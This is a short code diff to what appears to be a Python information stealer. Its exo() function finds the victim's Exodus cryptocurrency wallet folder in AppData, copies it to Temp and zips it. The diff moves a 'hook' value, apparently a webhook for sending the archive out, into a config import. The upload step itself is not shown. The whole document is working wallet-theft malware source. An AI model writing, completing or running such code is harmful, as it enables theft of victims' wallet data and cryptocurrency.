@@ -1,8 +1,8 @@
 import os.path, shutil, requests
+from config import hook
 
 user = os.path.expanduser("~")
 def exo():
- hook = ""
  if os.path.exists(user+"\\AppData\\Roaming\\Exodus"):
   shutil.copytree(user+"\\AppData\\Roaming\\Exodus", user+"\\AppData\\Local\\Temp\\Exodus")
   shutil.make_archive(user+"\\AppData\\Local\\Temp\\Exodus", "zip", user+"\\AppData\\Local\\Temp\\Exodus")
